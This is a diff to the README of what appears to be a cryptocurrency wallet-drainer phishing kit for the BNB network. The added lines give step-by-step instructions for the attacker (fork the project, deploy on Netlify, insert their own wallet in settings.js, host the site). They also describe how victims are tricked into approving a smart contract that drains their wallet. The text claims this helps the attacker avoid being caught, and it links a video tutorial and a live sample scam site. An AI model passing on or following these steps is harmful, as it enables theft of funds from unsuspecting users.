@@ -18,15 +18,30 @@ Deploy steps
 4. Add your wallet to settings.js file use bsc address 
 
 
-Steps after 
+Steps you have to do as the attacker
+
+1. fork
+
+2. deploy on netify
+
+3. add bsc wallet to settings.js
+
+4. host a site
+
+
+Steps that the victim has to do
 
 1.first connect to bnb network
 
 2.Click approve
 
-3.Smart contract approves you to drain wallet
+3.Smart contract gets approved then it will foward the data to the attackers wallet (you)
 
 4.Drain wallet
+
+Smart contract
+
+1. the smart contract will foward the data to you to prevent you from being caught 
 
 youtube tutorial https://www.youtube.com/watch?v=SnDlcDBAjso
 sample site https://busdminer.netlify.app/
